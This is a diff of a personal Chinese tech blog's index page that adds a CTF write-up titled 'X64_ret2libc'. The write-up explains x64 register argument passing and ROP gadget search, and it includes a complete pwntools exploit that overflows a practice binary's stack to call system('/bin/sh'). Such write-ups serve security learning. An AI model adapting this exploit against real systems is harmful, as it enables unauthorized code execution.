@@ -269,6 +269,277 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/13/page/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ice_bag(WXJ)">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ice_bag的技术博客，欢迎！">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/13/page/" itemprop="url">page</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-13T14:05:51+08:00">
+                2019-06-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/02/X64-ret2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ice_bag(WXJ)">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ice_bag的技术博客，欢迎！">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/02/X64-ret2libc/" itemprop="url">X64_ret2libc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-02T00:59:55+08:00">
+                2019-06-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原来PWN题都是用ubuntu做的啊！入门以来的这个学期我都用的是kali真的是太捞了，期间出现了各种各样莫名其妙的问题，<br>这是我在XMAN4遇到libcsearcher时碰到搜索结果不匹配时发现的，尴尬的是组会时槐师傅（其实是所有师傅）都说用ubuntu，<br>原来他们以前有教过，谁叫我是半路出家，头铁的用了半年kali。</p>
+<h1 id="X64汇编"><a href="#X64汇编" class="headerlink" title="X64汇编"></a>X64汇编</h1><p>与X86最大的不同之处就是X64的地址，寄存器，数据，都变成了8个byte，更重要的是，为了防止对栈溢出的滥用，X64不再采用<br>X86的压栈式的传参方式，而是采用专用的寄存器保存函数的参数，它们是RDI，RSI，RDX，RCX，R8和 R9。只有参数数量大于6<br>个时才会使用栈保存后面的参数。</p>
+<h2 id="内存异常"><a href="#内存异常" class="headerlink" title="内存异常"></a>内存异常</h2><p>可以使用的内存地址不超过0x00007fffffffffff,否则会抛出异常（非法访问）。</p>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>存在任意长read，会导致栈溢出。</p>
+<h1 id="劫持程序流"><a href="#劫持程序流" class="headerlink" title="劫持程序流"></a>劫持程序流</h1><p>与X86类似，栈溢出覆盖返回地址，</p>
+<h1 id="garget"><a href="#garget" class="headerlink" title="garget"></a>garget</h1><p>为了达成某些目的，我们需要给调用的函数合适的参数，如’/bin/sh’,在X86中，直接将参数写在payload里面，伪造栈帧，因为<br>它通过压栈传参。而X64就要复杂一些，构造栈帧不再有效，需要将参数传入寄存器，而这就是我们寻找garget的原因。</p>
+<h2 id="garget是什么"><a href="#garget是什么" class="headerlink" title="garget是什么"></a>garget是什么</h2><p>garget就是程序中的一句汇编语句，可以连续执行，一条接着一条，形如：pop xxx;ret;达到给寄存器赋值的目的，还可以连续不断的<br>延伸下去。</p>
+<h1 id="寻找-garget"><a href="#寻找-garget" class="headerlink" title="寻找 garget"></a>寻找 garget</h1><p>对于这道题，由于采用了动态链接，程序本身并不大，所以找不到太多合适的garget，有一个操作就是在libc中寻找，libc多大啊，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ROPgarget --binary libc.so.6 --only &quot;ret|pop&quot; | grep &quot;rdi&quot;</span><br></pre></td></tr></table></figure></p>
+<p>因为我们的最终目标是执行system(“/bin/sh”)所以我们需要一个pop rdi;ret,这是可以找的到的。</p>
+<h1 id="计算libc基址"><a href="#计算libc基址" class="headerlink" title="计算libc基址"></a>计算libc基址</h1><p>程序提供了libc真实地址，libc偏移量计算与X86下计算方法相同。<br>再计算出”bin/sh”,pop_ret的真实地址，可以开始构建payload了。</p>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>‘a’*(0x90-4)+pop_ret_addr+binsh_addr+sys_addr</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">p=process(&apos;./level4&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]</span><br><span class="line">pop_ret_offset = 0x0000000000021102 - libc.symbols[&apos;system&apos;]</span><br><span class="line">system_addr_str = p.recvuntil(&apos;\n&apos;)</span><br><span class="line">system_addr = int(system_addr_str,16)</span><br><span class="line">binsh_addr = system_addr + binsh_addr_offset</span><br><span class="line">pop_ret_addr = system_addr + pop_ret_offset</span><br><span class="line">payload=&apos;a&apos;*136+p64(pop_ret_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/09/jarvisoj-xman3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1396,288 +1667,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/01/三级管放大电路/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ice_bag(WXJ)">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ice_bag的技术博客，欢迎！">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/01/三级管放大电路/" itemprop="url">三级管放大电路</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-01T00:17:45+08:00">
-                2018-12-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/单片机/" itemprop="url" rel="index">
-                    <span itemprop="name">单片机</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/10/IIC总线通信/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ice_bag(WXJ)">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ice_bag的技术博客，欢迎！">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/10/IIC总线通信/" itemprop="url">IIC总线通信</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-10T12:58:21+08:00">
-                2018-11-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/单片机/" itemprop="url" rel="index">
-                    <span itemprop="name">单片机</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1728,7 +1717,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1750,7 +1739,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/标签/index.html">
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
